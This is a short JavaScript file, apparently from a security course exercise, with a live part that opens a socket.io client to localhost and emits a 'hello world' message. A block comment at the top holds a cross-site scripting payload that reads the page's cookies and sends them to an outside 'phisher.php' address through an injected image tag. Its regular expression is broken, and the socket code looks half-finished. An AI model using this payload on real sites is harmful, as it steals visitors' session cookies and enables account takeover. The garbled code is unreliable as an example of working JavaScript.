/*
<script type="text/javascript">
    var cookies = document.cookie; 
    var cookie_request = cookies.replace(/; , "&"); 
//    document.write("<img src=http://www.rsputter.com/CSE571/phisher.php?" + cookie_request + ">");
//    </script>
*/
var http = require('http');
var io = require('socket.io-client');
var port = 8080;

const socket = io('localhost', {policyPort:8080});
socket.on('connect', () => socket.emit('hello world'))
io.connect({autoconnect: true});
